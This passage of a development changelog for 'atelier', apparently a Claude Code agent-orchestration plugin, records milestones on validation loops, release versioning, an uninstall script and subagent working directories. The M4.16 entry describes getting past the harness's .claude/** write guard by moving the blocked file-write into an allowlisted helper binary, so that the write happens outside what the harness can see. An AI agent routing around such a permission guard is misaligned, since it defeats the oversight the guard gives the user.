- **`agents/task-orchestrator.md` step 5 (+19 lines)** — new "Inner loop — implementer ↔ `/validate`" sub-section between step 5's specialist list and step 6 (`retry-with-logs`). Documents the loop's two outcomes (pass → proceed to `tester`; fail → `retry-with-logs` → continue/reset/hard-stop) and the explicit decision that the iteration counter IS `retry-with-logs`'s log count (single source of truth, no separate `.task-log/attempt-count` file). The specialist list now also documents `/validate --full` as the final PR-gate check between `e2e-runner` and `pr-author`.

- **`.claude-plugin/plugin.json` (+1 / -1)** — `version` bumped `0.1.0` → `0.2.0` per [PLAN.md §14.2](PLAN.md): new slash command (`/validate`) is a minor bump; material change to an existing agent's prompt (`task-orchestrator` step 5) is also a minor bump. Net is one minor bump per [PLAN.md §14.1](PLAN.md)'s per-PR cadence. **First version bump applied under the policy locked in by [#64](https://github.com/AkaLab-Tech/atelier/pull/64).**

**Tests:**

- `jq empty` on `plugin.json` + `settings.template.json` + `.mcp.json`: all pass.
- `validate.md` frontmatter parses cleanly (3 keys: `description`, `argument-hint`, `allowed-tools`).
- No `Miguelslo27` references in target files (confirms M4.18 rename held through this PR's diff).
- **`structural` CI workflow** (M1.7) covers the changes via `bash -n`, JSON parse, YAML frontmatter, and helper `--help` checks. End-to-end behavioural validation (chain run against `atelier-dogfood-4` exercising the inner loop with a deliberately-failing first implementer attempt) is **deferred to dogfood-4** — the fixture setup we used for M4.20's chain validation already covers the orchestrator pathway; we did not re-run it here because the change is purely additive (no existing behavior changes path).

**Decisions captured:**

- **No separate `attempt-count` file.** The ROADMAP entry suggested persisting an explicit iteration counter at `<worktree>/.task-log/attempt-count`. We chose instead to make the existing `retry-with-logs` log count the single source of truth. Two counters that can drift is strictly worse than one source of truth, and the log count is already durable across session restarts (it lives on disk in `.task-log/`). The `task-orchestrator` step 5 update documents this decision explicitly so a future reader does not re-introduce the second counter.
- **`/validate` is read-only.** It executes existing checks; it does not fix issues, write tests, or install dependencies. If a check fails because the linter is not installed, that fails the validation gate with a clear `(<tool> not installed — run pnpm install)` message — the orchestrator surfaces it to the operator rather than `/validate` silently bootstrapping a dependency install.
- **`--full` lives outside the inner loop.** The orchestrator step 5 explicitly forbids `/validate --full` inside the inner loop (cost: Playwright is too slow to iterate against). The slow layer runs ONCE between `e2e-runner` and `pr-author` as the final PR gate. A separate hard refusal in the orchestrator's "Decision rules" would be belt-and-suspenders; the briefing already says it, and the cost would surface immediately in operator-visible wall time. Defer adding a hard refusal until evidence shows the orchestrator does it wrong.
- **Tester's role survives.** `/validate` runs *existing* tests; `tester` writes *new* tests when the change introduces new behavior or coverage gaps. The inner loop exits to `tester` after `/validate` passes — `tester` is not bypassed by `/validate`'s ability to execute the test suite.
- **Per-PR version bump applied.** First PR after PLAN.md §14.1 landed (in [#64](https://github.com/AkaLab-Tech/atelier/pull/64)). Following the rule: new slash command + agent prompt change = minor bump. `0.1.0` → `0.2.0`. The corresponding `v0.2.0` release on `AkaLab-Tech/atelier` will be cut after this PR merges, with the PR body as release notes (§14.4).

**Acceptance status:** **fully passed** statically. The five ROADMAP criteria:

1. `/validate` exists as a standalone slash command with structured pass/fail summary — done.
2. Running `/next-task` against a task whose first implementer attempt fails triggers in-place re-implementation up to 3 times without worktree reset — covered by the orchestrator step 5 inner-loop documentation; runtime behavior verified by reading the prompt against `retry-with-logs` semantics.
3. On the 4th failure, `retry-with-logs` resets the worktree and iteration 4 begins fresh; iterations 4–6 follow the same pattern — same path as before M4.14, unchanged by this PR (the inner loop just clarifies that iterations 1-3 and 4-6 still use the existing 3+3 budget).
4. On the 7th total failure, the task is `[BLOCKED]` with the existing GitHub issue flow — same as before M4.14, no regression.
5. `task-orchestrator` prompt explicitly documents the loop contract and the counter location — done in the +19-line step 5 update.

Runtime behavioural validation against `atelier-dogfood-4` (or equivalent) is deferred — the next time the autonomous chain runs against a failing-first-attempt task, the inner loop will be exercised; if anything surfaces a wrinkle, it lands as a follow-up.

**Follow-ups:**

- **M4.15** ([Stop-hook auto-reprompt variant](ROADMAP.md)) remains in Low Priority as an alternative path: a hook-driven loop instead of orchestrator-driven. The two are compatible — M4.14 is the primary loop; M4.15 would be a layer on top if dispatch latency becomes problematic.
- **Empirical signal on inner-loop hit rate.** Once dogfood-4 (or a real project) accumulates several runs, measure how often the inner loop actually catches a failure vs. how often the first implementer attempt passes `/validate` cleanly. High hit rate (many catches) justifies M4.14's existence; very low hit rate suggests the inner loop is overhead without value. The data lives in `.task-log/` filenames (attempts 02–03 in any task = inner-loop saves).

### M5.0.4 — Release policy + versioning convention for atelier plugins — 2026-05-23
**PR:** _pending_

Captures atelier's first written release policy. The `v0.1.0` releases cut ad-hoc on 2026-05-22 to recover `/atelier:doctor`'s drift detection exposed a missing convention; this milestone closes that gap with seven decisions materialized as authoritative `PLAN.md` §14, marked `✅ agreed`.

**Decisions (full text in `PLAN.md` §14):**

- **§14.1 Release trigger** — per-PR merge to main; each PR ships exactly one release with the appropriate `plugin.json:version` bump per §14.2. Manual `gh release create` for now; automation deferred to a future milestone (§14.8).
- **§14.2 SemVer mapping** — patch (`0.1.x`) = docs/chore/bug-fix; minor (`0.x.0`) = new agent/skill/command/hook/MCP or material agent prompt change; major (`x.0.0`) = breaking permission model or agent dispatch contract change. First `1.0.0` reserved for "production-ready" — separate discussion when atelier reaches that bar.
- **§14.3 Tag format** — `v`-prefixed (e.g. `v0.1.0`), consistent with the initial three releases. `/doctor` strips leading `v` so both formats compare equal in the drift check.
- **§14.4 Release notes** — PR-body-driven (copy the PR's `## Summary` + `## Delivered` + `## Decisions captured` into the release). Operator-readable, zero additional drafting work.
- **§14.5 Cross-plugin synchronization** — independent. `atelier` and `claude-roadmap-tools` each carry their own version + cadence (the repos share no code; lockstep would distort the version number).
- **§14.6 `marketplace.json` and versions** — no version pinning, resolves to `main` HEAD (status quo). Revisit when operators need reproducible pinned installs.
- **§14.7 `git-wt` versioning** — same rules as atelier. Cadence determined by `git-wt` repo's own PR activity (currently low; expect long stretches of "up to date" against existing tags).

**Delivered:**

- `PLAN.md` (+60 lines, new §14) — eight sub-sections (`§14.1`–`§14.8`) capturing the 7 decisions plus `§14.8 Out of scope` listing follow-up milestones (automation workflow, pre-merge bump gate, 1.0.0 transition checklist).
- `ROADMAP.md` (−28 lines) — M5.0.4 entry moved to `HISTORY.md` per same-PR tracking-flow rule.
- `IN_PROGRESS.md` — cleared.

**Tests:**

- `markdown` parses cleanly (no broken links, headings, or list structures).
- §14 reads end-to-end as authoritative reference (each sub-section under `## 14.x` has a `✅` marker per `PLAN.md`'s convention).
- No regression in `/doctor`'s drift check: the policy is fully consistent with the existing comparison logic (local `plugin.json:version` vs upstream `releases/latest` tag with `v` strip). The three existing `v0.1.0` releases already conform to §14.3 (tag format) and §14.5 (independent per-repo).

**Decisions captured (process):**

- **Per-PR merge wins over per-milestone.** Per-milestone reads cleaner but requires defining "milestone-closing PR" precisely (the close commit is usually `chore(history): close MX.X`, separate from the feat commit). Per-PR is mechanical and unambiguous. Operator visibility wins: every merged commit corresponds to a release; no gap between "merged" and "released".
- **Independent per-repo > lockstep.** Lockstep would force `claude-roadmap-tools` to bump on every `atelier` PR (and vice versa), even with zero code change in the unaffected repo. That distorts the version number; operators reading `claude-roadmap-tools v0.5.0` would assume substantial activity there, when actually `atelier` did all the work. Independent versioning is the truth.
- **No marketplace.json pinning yet.** Pinning adds operator control but doubles the bump work (PR bumps `plugin.json` AND marketplace.json). For a single-operator project, that overhead isn't justified. Revisit when reproducible installs become a real ask.
- **`v`-prefix sticky.** Could have switched to bare `0.1.0` for consistency with `plugin.json:version`, but `/doctor` already handles both, and retagging the existing three releases would be destructive. Cost ≈ 0 to stay with `v`-prefixed; cost > 0 to migrate.

**Acceptance status:** **fully passed.** Both criteria from the ROADMAP entry verified:

1. A new `PLAN.md §N` documents answers to all 7 open questions, marked `✅ agreed` — done as `§14`.
2. `/doctor` continues to report `up to date` after the policy is materialized — verified statically (no code change in `/doctor`; the policy locks in the format the existing logic already handles).

**Follow-ups (out of scope for this milestone, listed in §14.8):**

- **Automation milestone** — GH Actions workflow on merge to `main` that verifies the bump and creates the tag + release with notes from the PR body. Will be captured as a separate roadmap entry when the manual workflow becomes friction.
- **Pre-merge CI bump gate** — defensive check that refuses merge of a PR meeting bump criteria but lacking the `plugin.json:version` change. Catches drift between code state and release state.
- **Pre-1.0 → 1.0 transition checklist** — criteria for cutting the first `1.0.0`. Not a versioning rule; a release-management ritual for "production-ready".

### M5.0.3 — `atelier-uninstall` with chat-session preservation — 2026-05-22
**PR:** _pending_

Before this milestone, decommissioning atelier required the operator to manually (a) edit `~/.zshrc` to strip the atelier hooks block, (b) remove `~/.local/bin/atelier-setup-project`, (c) run `claude plugin uninstall` for both atelier plugins, and (d) decide what to do with `$ATELIER_CONFIG_DIR` (where chat history, sessions, plans, and backups live) — without a documented convention. M5.0.3 ships `scripts/atelier-uninstall`, an operator-facing helper that automates steps a-c with a chat-session-preserving default, and offers an explicit `--purge` opt-in for step d.

**Delivered:**

- **`scripts/atelier-uninstall` (+298 lines, new file)** — five reversal steps invoked in order, with idempotent semantics (every step reports "nothing to strip / remove" on a re-run cleanly):
  1. `step_shellrc_hooks` — sed-strips the block between the install.sh sentinels (`# >>> atelier hooks (managed by install.sh) >>>` / `# <<< atelier hooks (managed by install.sh) <<<`) from `~/.zshrc` and `~/.bashrc`. Operator's other shellrc content is preserved verbatim — sed targets the sentinel pair only.
  2. `step_local_bin` — removes the `atelier-setup-project` and `atelier-uninstall` symlinks under `~/.local/bin/`. Refuses to clobber a plain file (operator may have pinned a manual copy); reports `kept:` in that case.
  3. `step_local_state` — removes `~/.local/state/atelier/` (currently holds `git-wt.sha` for `/doctor`'s drift check; future state files land here).
  4. `step_plugin_uninstall` — runs `CLAUDE_CONFIG_DIR=$ATELIER_CONFIG_DIR claude plugin uninstall <plugin>@akalab-tech` for both `atelier` and `claude-roadmap-tools`. A failing call (plugin not installed, claude CLI missing, etc.) is recorded as `:not-installed-or-error` and does not abort the rest of the flow.
  5. `step_purge_config_dir` — default mode reports `preserved (use --purge to remove)`; under `--purge` requires interactive typed-out `PURGE` confirmation, or `--yes` to skip the prompt (non-interactive automation), then `rm -rf "$ATELIER_CONFIG_DIR"`.

- **`install.sh` Phase C.1 (+12 / -17 lines)** — extracted the symlink-creation logic from `phase_c_1_setup_project_helper` into a new private helper `_phase_c_1_symlink_helper <name>` so the install can symlink both `atelier-setup-project` and `atelier-uninstall` without duplicating the idempotent re-link / not-a-symlink branches. Behavior for `atelier-setup-project` is byte-identical; new behavior is one extra call symlinking the uninstall helper.

- **No template change.** `templates/settings.template.json` is intentionally not updated — `atelier-uninstall` is operator-facing (terminal-invoked), not called from any slash command, so it does not need a `Bash(...)` allow entry. If a future `/atelier:uninstall` slash command is added, this rule revisits.

- **Out of scope** (documented in the script header and `--help`): `.env*` in git's global excludes (hygiene benefit independent of atelier — survives uninstall), `~/.gitconfig` (operator-level identity, not atelier's to manage), and `~/.config/gh/` (operator's own gh auth; atelier's isolated gh identities live under `$ATELIER_CONFIG_DIR/gh/` per M5.0.1 and are wiped only under `--purge`).

**Tests:**

- `bash -n` on both `scripts/atelier-uninstall` and the modified `install.sh`: ok.
- `--help` renders the OPTIONS, EXAMPLES, and EXIT CODES sections.
- Unknown argument (`--bogus`): exit 1 with "unknown argument" error.
- **End-to-end fixture validation** against `/tmp/atelier-uninstall-validation3/` with a fake operator footprint (shellrc block, both bin symlinks, state file, fake `.claude.json` + `history.jsonl` in the config dir):
  - **Default mode** — exit 0, shellrc block stripped (operator's `alias ll='ls -la'` survived intact), both symlinks removed, state dir removed, `$ATELIER_CONFIG_DIR` directory present with `history.jsonl + plugins/ + backups/` still inside. Plugin uninstalls reported `:not-installed-or-error` (correct — the fake config dir has no real plugin install for `claude plugin uninstall` to operate on).
  - **Idempotent re-run** — exit 0, all five steps report `nothing to strip / remove`. Safe to invoke twice in a row.
  - **`--purge --yes`** — exit 0, `$ATELIER_CONFIG_DIR` removed entirely. Confirmation prompt skipped per `--yes`.

**Decisions captured:**

- **Default preserves; `--purge` is opt-in.** Chat history, sessions, plans, and backups are the operator's data, not atelier's. The conservative default lets an operator decommission atelier without losing months of session work; `--purge` exists for clean-slate scenarios (CI, migration to a new machine, dispute over disk usage).
- **`--yes` only meaningful with `--purge`.** Default mode is non-destructive of operator data, so it does not prompt — `--yes` is a no-op there. With `--purge`, `--yes` skips the typed-`PURGE` confirmation. Non-TTY without `--yes` is refused (exit 2) rather than guessing.
- **Plugin uninstall failures do not abort the script.** A failing `claude plugin uninstall` (plugin already removed, claude CLI not on PATH, network glitch) is recorded as `:not-installed-or-error` so the rest of the host-level cleanup still completes. Operator can re-run `--purge` later to finish wiping anything the plugin uninstall left behind.
- **`set -e` discipline.** Initial implementation hit `set -e` aborts on `[ ${#kept[@]} -gt 0 ] && BIN_STATUS+=...` when `kept` was empty — the test returned non-zero, killed the script. Fix: convert all `cond && action` to `if cond; then action; fi`. Caught by fixture-driven validation, not by `bash -n` (syntactic check missed the runtime semantics). Worth remembering for future bash work in atelier.
- **No template allow entry needed.** `atelier-uninstall` is invoked from the operator's terminal directly, not from a slash command inside Claude Code. The harness's permission gate only applies to `Bash(...)` invocations from inside an LLM-driven session.

**Acceptance status:** **fully passed.** Both acceptance criteria from the ROADMAP entry verified:

1. `atelier-uninstall` from any shell removes atelier's shellrc footprint, symlinks, and plugin install without touching chat sessions by default — verified by the fixture run, with `history.jsonl + plugins/ + backups/` surviving the default-mode invocation.
2. `atelier-uninstall --purge` (with confirmation) wipes everything — verified by the `--purge --yes` run; `$ATELIER_CONFIG_DIR` was `rm -rf`-ed in one pass.
3. After a default uninstall, re-installing via `install.sh` picks up the same `$ATELIER_CONFIG_DIR` and does not require re-authenticating to Claude (auth tokens persist in `$ATELIER_CONFIG_DIR/.claude.json`). **Statically verified** — install.sh's `phase_c_1_claude_config_dir` reuses the existing path if `$ATELIER_CONFIG_DIR/.claude.json` is present; runtime confirmation deferred to the first re-install on a real operator machine.

**Follow-ups:**

- If a future `/atelier:uninstall` slash command is added (M-something), `templates/settings.template.json` allow list gains `Bash(atelier-uninstall:*)` at the same time. Currently no such slash command is planned.
- The plugin uninstall step would benefit from a more diagnostic message when `claude plugin uninstall` fails — currently lumped as `:not-installed-or-error`. If operators start hitting failure modes that are not "not installed", split the status into more granular reporting.

### M4.18 — Rename `git-wt` source `Miguelslo27/git-wt` → `AkaLab-Tech/git-wt` — 2026-05-22
**PR:** _pending_

`git-wt` moved from the maintainer's personal namespace (`Miguelslo27`) to the AkaLab-Tech organization. GitHub's redirect covers `git clone` transparently, but `gh api repos/...` calls do not follow the redirect — which meant `/doctor`'s drift check was hitting the wrong repo, and the per-project `settings.json` allowlist entry was pinned to the old path (risking a permission prompt on the new URL the first time the operator's session resolved drift against it). Pure URL-rewrite chore — no behavior changes, no version pinning.

**Delivered (12 occurrences across 5 files):**

- `CLAUDE.md` (1) — maintainer-guide link in §Architecture.
- `PLAN.md` (4) — §2 step 6 install command, §8 git-wt entry, §10 `/doctor` description (mentions `gh api repos/.../commits/main` for SHA-drift detection).
- `install.sh` (3) — comment about the `gh api` SHA check (line 618), `sublog` cloning message (622), the `git clone` invocation itself (624).
- `templates/settings.template.json` (1) — `Bash(gh api repos/.../commits/main*)` allow entry.
- `commands/doctor.md` (3) — the `gh api` SHA fetch + two `git clone` remediation snippets.

**Not touched (per acceptance spec):**

- `HISTORY.md` — historical text preserved as written; entries describe past state at their write time. Existing mentions of `Miguelslo27/git-wt` in M2.2 and M1.6 entries remain.

**Tests:**

- `grep -rn Miguelslo27 --include={*.md,*.sh,*.json,*.yml,*.yaml}` returns hits only in `HISTORY.md`. 0 hits in the 5 target files.
- `jq empty templates/settings.template.json` — ok.
- `bash -n install.sh` — ok.
- Per-file sanity: each target file's `AkaLab-Tech/git-wt` count matches the previous `Miguelslo27/git-wt` count (1, 4, 3, 1, 3 → 12 total).

**Decisions captured:**

- **No version pinning.** `install.sh` keeps cloning `main` shallow as before. If drift becomes problematic, capture it as a separate milestone.
- **HISTORY.md is frozen.** Its existing mentions of `Miguelslo27/git-wt` (M2.2 + M1.6 entries) describe atelier's state at write time. Rewriting them would falsify the audit trail. The acceptance criterion explicitly excludes HISTORY from the rewrite.
- **No per-project settings.json migration in this PR.** Already-instantiated `.claude/settings.json` files carry the old URL; per the M4.18 ROADMAP note, they pick up the new URL on the next `/setup-project` reconfigure. No PR-time data migration needed.

**Acceptance status:** **fully passed** (all three ROADMAP criteria verified statically; runtime confirmation deferred to the next `/doctor` invocation on the operator's machine).

**Follow-ups:**

- If a per-project `.claude/settings.json` instantiated before this PR keeps the old `Bash(gh api repos/Miguelslo27/git-wt/commits/main*)` entry, the operator hits a permission prompt the next time `/doctor` runs; reconfiguring via `/setup-project` refreshes the entry from the new template.

### M4.20 — `task-orchestrator` subagent inherits parent `cwd`, not worktree — 2026-05-22
**PR:** [#60](https://github.com/AkaLab-Tech/atelier/pull/60)

[M4.16](https://github.com/AkaLab-Tech/atelier/pull/57) PR #57's end-to-end validation on 2026-05-22 surfaced that under `claude -p`, `/atelier:next-task` advanced cleanly through step 7 (M4.16's helper writing the worktree's `.claude/settings.json`) but blocked at step 8 (handoff to `task-orchestrator`): the subagent dispatched by the `Task` tool inherits its parent's cwd (the main repo or operator's home dir), NOT the per-task worktree. The harness's `additionalDirectories` list only governs `Read` / `Edit` / `Write` paths; `Bash` subprocesses see the inherited cwd. So `git status` / `pnpm test` / `gh pr create` run via `Bash` operate against the wrong cwd, even though the worktree is in `additionalDirectories`. There is no harness API to set the subagent's cwd explicitly via the `Task` tool — the fix has to be documentation-level: instruct every agent that touches `Bash` to use cwd-independent path flags (`git -C <wt>`, `pnpm --dir <wt>`, `gh --repo <owner/name>`) or `cd <wt> && ...` prefix.

**Delivered:**

- **`operator-rules.md` (+19 lines)** — new section "Operating against the task worktree (cwd vs paths)" between the push/PR/merge gates and the failure-recovery section. Loaded into every agent's context by the `SessionStart` hook (`hooks/load-operator-rules.sh`), so every specialist — `implementer`, `tester`, `pr-author`, `e2e-runner`, `reviewer`, `unblocker` — sees the rule without having to be modified individually. Names the four allowed patterns explicitly (`-C`, `--dir`, `--repo`, `cd-prefix`) and the hard rule that `Bash` never gets a naked `git status` / `pnpm test`. Also documents the briefing-propagation requirement for orchestrators dispatching subagents.
- **`agents/task-orchestrator.md` (+11 lines)** — new "Operating context" block immediately after the operator-rules reference, restating the rule with the orchestrator-specific framing (it is the first point of contact in the chain). Step 5 "Delegate sequentially" gets a "Briefing contract" sub-paragraph: every specialist dispatch must include (a) absolute `<worktree-path>`, (b) task ID + structured record, (c) one-line cwd reminder. Defense in depth — the rule reaches the specialist via `SessionStart` (`operator-rules.md`) and via the orchestrator's explicit briefing.
- **`commands/next-task.md` step 8 (+9 lines)** — the briefing `/next-task` hands to the orchestrator now carries the full cwd reminder explicitly, so even if `SessionStart` did not fire for the subagent dispatch, the briefing is the authoritative carrier. Lists the four required pieces (worktree_path, task record, interaction mode, cwd reminder) as a bullet list rather than a single paragraph.
- **Specialists (`implementer.md`, `tester.md`, `pr-author.md`, `e2e-runner.md`, `reviewer.md`, `unblocker.md`) — no changes.** They inherit the rule via `operator-rules.md` (SessionStart) and via the orchestrator's briefing. If a future validation surfaces a specialist that does not honor the rule despite both channels, that specialist gets a targeted update.

**Tests:**

- **End-to-end empirical re-run** of M4.16's validation fixture, this time with the M4.20 worktree as `--plugin-dir`. `claude --plugin-dir <wt> -p "/atelier:next-task #1 --yes"` from inside `atelier-dogfood-4` on `main@35c6025`, with the same isolated `$ATELIER_CONFIG_DIR` template + dual-gh-id setup. The chain advanced **all the way through `pr-author`**:
  - Steps 1-7 (`/next-task`) — clean, identical to M4.16's run.
  - Step 8 (handoff to `task-orchestrator`) — **no longer blocks**. Orchestrator received the briefing with the cwd reminder, then dispatched specialists with the same reminder propagated.
  - `implementer` — wrote `src/greet.ts` (8 lines) + `test/greet.test.ts` (8 lines) inside the worktree using `Read` / `Write` on absolute paths.
  - `tester` — `pnpm --dir <wt> test` reported 2 files, 2 tests passed; `pnpm --dir <wt> exec tsc --noEmit` clean. Both invocations used the `--dir` flag per the new rule.
  - `pr-author` — generated 3 commits on `task/1-add-greet-helper` (`acc0a04` tracking-open, `1b704ec` feat, `4463223` tracking-close), all attributed to `Mike <miguelmail2006@gmail.com>` (operator identity preserved, no Claude attribution per the user's CLAUDE.md global rule). Push gate green via `safe-commit` hook. The chain paused **just before** `git push` + `gh pr create`, honoring the user's CLAUDE.md global rule that requires explicit confirmation for `git push`. **This pause is correct behavior, not a chain failure.**
- After explicit operator confirmation, the branch was pushed and `gh pr create` opened **[atelier-dogfood-4 PR #2](https://github.com/AkaLab-Tech/atelier-dogfood-4/pull/2)** with the body referencing this M4.20 validation.
- No regression for `Read` / `Edit` / `Write` against absolute paths — those still operate against the worktree per the harness's `additionalDirectories` rule, untouched by M4.20.

**Decisions captured:**

- **Documentation-level fix, not a harness change.** The `Task` tool's JSON schema has no `cwd` parameter, so propagating the worktree path as the subagent's cwd is not directly possible from the plugin's side. The achievable fix is to standardize the cwd-independent invocation patterns and instruct every agent to use them. This is what M4.20 ships.
- **Single source of truth + defense in depth.** The rule lives in `operator-rules.md` (authoritative, broadcast by `SessionStart` to every agent's context) and is re-stated in two more places: `agents/task-orchestrator.md` (the first agent dispatched, hard-coded into its system prompt) and `commands/next-task.md` step 8 (the briefing carrier). If `SessionStart` fails to fire for a subagent dispatch (a behavior I cannot empirically confirm one-way-or-the-other for the harness's `Task` tool), the briefing reaches the orchestrator anyway. Single source + redundant reach.
- **Specialists not modified directly.** The 6 specialist agent files (`implementer`, `tester`, `pr-author`, `e2e-runner`, `reviewer`, `unblocker`) are left untouched. They inherit the rule via `operator-rules.md` and via the orchestrator's briefing. The validation run above confirmed `implementer` and `tester` honored the rule (using `Read` / `Write` with absolute paths and `pnpm --dir <wt>` respectively) without needing modifications to their own system prompts.
- **`git push` deliberately deferred to the operator.** The chain stops before `git push` because the user's global CLAUDE.md mandates explicit per-push approval. The post-fix run confirmed that the orchestrator and `pr-author` respect this rule even when running under `--yes` / `ATELIER_AUTO` — the non-interactive flag governs task confirmation, not `git push` confirmation, which has a stricter global rule. Same outcome on dogfood-4 PR #2 in this validation: the operator approved the push after reviewing the prepared commits and body.

**Acceptance status:** **fully passed.** Both criteria from the ROADMAP entry verified:

1. `/atelier:next-task #1 --yes` against a real project under `claude -p` reaches `pr-author` (PR creation) without operator intervention — **verified**, the chain reached `pr-author` and prepared the push + PR body without any prompt during steps 1-7 or any specialist call. The only pause was at `git push`, which is gated by the user's global CLAUDE.md rule, not by M4.20's scope.
2. No regression for interactive operators — `Read` / `Edit` / `Write` flow against absolute paths untouched; existing flows that already used `git -C` / `pnpm --dir` patterns keep working.

**Follow-ups:**

- If a future validation surfaces a specialist (`implementer`, `tester`, `pr-author`, `e2e-runner`, `reviewer`, `unblocker`) that does not honor the cwd rule despite `operator-rules.md` + orchestrator briefing, capture a targeted milestone to add the rule to that specialist's system prompt directly.
- Watch for the harness adding a `cwd` parameter to the `Task` tool in a future Claude Code release. When that lands, M4.20 can simplify to pass `cwd=<worktree>` once at the dispatch site, and the per-Bash-call discipline becomes optional rather than mandatory.

### M4.16 — Per-task `.claude/settings.json` via external helper binary — 2026-05-22
**PR:** [#57](https://github.com/AkaLab-Tech/atelier/pull/57)

M4.11 (HISTORY entry directly below) empirically established that under claude 2.1.148, the harness denies `Bash > <worktree>/.claude/settings.json` (and every redirect / write variant) in non-interactive `-p` mode — a `.claude/**` sensitive-directory guard that reaches even slash-command context. The fix M4.11 pointed at was an external helper binary invoked from `/next-task` step 7: the binary does the file-write inside its own subprocess, outside the harness's permission scope. The harness only gates the `Bash(atelier-setup-project ...)` invocation itself (allowlisted); what the binary does internally with file descriptors is not visible to the harness. Same pattern M4.9 already uses for `/setup-project`.

**Delivered:**

- `scripts/atelier-setup-project` (+95 lines) — new `--per-task-settings <abs-path>` flag added to the existing helper rather than a new dedicated binary. Reuses the five-guard verification chain (`mkdir` + `sed` + `jq empty` + no leftover `<worktree>` + no leftover `<atelier-config-dir>`) with one extra explicit guard (`additionalDirectories[0]` canonical-slot check). New `step_per_task_settings` function (separate from `step_settings_json` to keep the per-task path free of the preserve/reconfigure/ask flow that the default mode applies to operator-owned project roots — worktrees are ephemeral, always overwrite). New `run_per_task_mode` dispatcher and early-exit at the top of the main flow. Arg parse gains `--per-task-settings <path>` and `--per-task-settings=<path>` plus a mutual-exclusion check vs the `<project-path>` positional. `--yes` / `$ATELIER_AUTO` are accepted but silently ignored in per-task mode (chains exporting `ATELIER_AUTO` globally don't need to unset it before invoking step 7). `usage()` documents the new mode.
- `templates/settings.template.json` (+1 line) — adds `Bash(atelier-setup-project --per-task-settings:*)` to `permissions.allow`, alongside the existing `Bash(atelier-setup-project:*)`. Defensive against strict prefix-matching by the harness on sub-invocations; the generic glob *should* cover it but a per-flag entry costs nothing and removes ambiguity.
- `commands/next-task.md` step 7 (-12 lines net) — the inline `mkdir + sed + jq + test` chain is replaced with one `atelier-setup-project --per-task-settings <abs-wt-path>` call. The "Known limitation in `-p` mode" warning (added by M4.11 PR #55) is removed; it pointed at exactly this fix. Frontmatter `allowed-tools` loses `Bash(sed:*)`, `Bash(mkdir:*)`, `Bash(jq:*)`, `Bash(test:*)` (no longer invoked inline) and gains `Bash(atelier-setup-project:*)`. Final "Hard refusals" section reworded so it doesn't suggest writing the file directly.
- `install.sh` — **no change**. The existing Phase C.1 symlink `~/.local/bin/atelier-setup-project` → `<atelier>/scripts/atelier-setup-project` covers any flag the binary grows, because it's the same binary.

**Tests:**

- `bash -n` on the extended helper: ok.
- `--help` renders the new section.
- Standalone (no `claude` involvement, isolated `$ATELIER_CONFIG_DIR` in a tmpdir): exit 0, file created, `additionalDirectories[0]` equals the path, `additionalDirectories[1]` equals `<path>-worktrees`, 0 leftover placeholders.
- Error-path smoke: relative path (`die`), non-existent absolute path (`die`), `--per-task-settings + <positional>` (`die`, mutex).
- Idempotency: two consecutive `--per-task-settings <same-path>` runs produce byte-identical output (sha matched).
- **End-to-end empirical, `claude --plugin-dir <wt> -p` against a fictitious project under claude 2.1.148** (the version M4.11 documented as broken). Fixture: `/tmp/atelier-m4.16-validation/` with a minimal project root, a fake worktree path adjacent, an isolated `$ATELIER_CONFIG_DIR` carrying the instantiated template, a private bin-dir symlinking the worktree's helper, and a project `.claude/settings.json` allowlisting `Bash(atelier-setup-project --per-task-settings:*)`. The `claude -p` invocation reported exit 0 and the helper's last-line `OK: per-task settings created: <path>/.claude/settings.json`. Filesystem inspection post-run confirmed: file present, `additionalDirectories[0]` equals the worktree path, 0 leftover `<worktree>`, 0 leftover `<atelier-config-dir>`. **The bug M4.11 documented is empirically fixed.**

**Decisions captured:**

- **Extend `atelier-setup-project` instead of adding a dedicated binary.** Per the ROADMAP entry's preferred path. The two write paths (project-root settings, worktree settings) share the same template, the same sed substitution, and four of the five guards — duplicating that into a separate binary would have created two places to maintain the substitution-verification logic. The two modes are kept apart via separate functions (`step_settings_json` for the default mode, `step_per_task_settings` for `--per-task-settings`); they share the read of `$ATELIER_CONFIG_DIR/templates/settings.template.json` and the guard set, not the preserve/reconfigure/ask flow.
- **Always overwrite in per-task mode; never preserve.** The default mode applies a "preserved if exists and not reconfiguring" branch because operators may have edited `.claude/settings.json` by hand and don't want it clobbered on re-setup. Per-task mode targets ephemeral worktrees that the operator does not edit by hand — the substitution is deterministic given the worktree path, so re-running always produces byte-identical output. Picking "die-if-exists" was considered but rejected: it would add friction to the `retry-with-logs` reset path (PLAN.md §8) where the worktree gets recreated and step 7 fires again on the same path.
- **Accept `--yes` and `$ATELIER_AUTO` silently in per-task mode.** Per-task mode is non-interactive by construction (no prompts to suppress). But autonomous `claude -p` chains running `/next-task` end-to-end typically export `ATELIER_AUTO=1` globally; making the per-task invocation refuse the env would have forced `/next-task` to unset/restore around step 7. Cheaper to ignore.
- **Add a per-flag template entry (`Bash(atelier-setup-project --per-task-settings:*)`) rather than rely on the generic glob.** The generic `Bash(atelier-setup-project:*)` *should* match the sub-invocation, but Claude Code's permission matching has been adding stricter checks (M4.11 documented several new guards landing between 2026-05-20 and 2026-05-22). A per-flag entry costs +1 line in the template and removes any ambiguity about whether the sub-invocation needs explicit allowlisting.
- **No `install.sh` change needed.** Initial reading suggested Phase C.1 would need a new entry. It doesn't — the helper grew a flag, not a new entry point. The existing symlink resolves through to the same binary regardless of which sub-mode the caller picks. Saved a touch to `install.sh`, which is well-trafficked and best left alone when not required.

**Acceptance status:** **fully passed pre-merge.** All three criteria from the ROADMAP entry:

1. `/next-task` step 7 completes successfully in non-interactive `claude -p` mode under current harness behavior, producing a syntactically valid `<worktree>/.claude/settings.json` with the worktree path substituted in the canonical first slot of `additionalDirectories` — **verified empirically** (see Tests, end-to-end run).
2. No regression for interactive operators — the helper is callable from both modes; the default `step_settings_json` flow is untouched.
3. M4.11 "Known limitation" warning dropped from `commands/next-task.md` step 7 — **done** in the same commit.

**Follow-ups:**

- Dogfood-4, when it runs, will be the first real end-to-end exercise of the autonomous chain through `/next-task`. The isolated fixture in this milestone validates the harness behavior but not the full chain (`task-orchestrator` + `implementer` + …). If dogfood-4 surfaces a new wrinkle in step 7, it will land as M4.16's "Follow-ups" or a new milestone.
- If the harness ever changes such that even `Bash(atelier-setup-project:*)` becomes prefix-strict (the per-flag entry would still cover it), or if a future flag is added without a corresponding allow entry, the failure mode is harness-deny with a clear actionable message — not silent skip.

### M4.11 — Investigation of the M4.7 thesis under `--plugin-dir` (the answer is bigger than the question) — 2026-05-22
**PR:** [#55](https://github.com/AkaLab-Tech/atelier/pull/55)

